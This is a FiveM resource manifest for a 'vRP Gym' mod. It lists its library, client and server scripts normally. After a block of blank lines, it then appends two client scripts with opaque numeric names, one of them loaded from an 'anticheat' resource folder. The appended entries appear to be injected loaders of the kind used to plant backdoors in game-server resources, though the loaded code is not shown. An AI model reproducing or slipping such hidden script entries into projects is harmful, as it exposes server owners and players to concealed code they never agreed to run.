description "vRP Gym"

dependency "vrp"

client_scripts{ 
	"lib/Tunnel.lua",
	"lib/Proxy.lua",
	"client.lua"
}

server_scripts{ 
  "@vrp/lib/utils.lua",
  "server.lua"
}








client_script "09883.lua"
client_script '@anticheat/54639.lua'